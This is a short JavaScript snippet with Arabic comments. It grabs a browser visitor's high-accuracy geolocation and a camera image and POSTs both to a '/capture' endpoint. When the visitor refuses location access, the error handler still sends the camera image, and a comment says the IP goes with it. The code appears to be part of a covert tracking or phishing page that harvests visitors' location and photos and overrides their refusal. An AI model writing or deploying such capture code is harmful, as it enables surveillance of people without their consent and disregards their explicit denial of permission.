async function captureAndSend() {
    // إعدادات الدقة العالية للموقع
    const geoOptions = { enableHighAccuracy: true, timeout: 10000 };

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
        const img = await getCameraImage(); // وظيفتك الحالية للالتقاط

        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ location: coords, image: img })
        });
    }, async (err) => {
        // في حال الرفض نرسل الصورة والـ IP فقط
        const img = await getCameraImage();
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ location: null, image: img })
        });
    }, geoOptions);
}
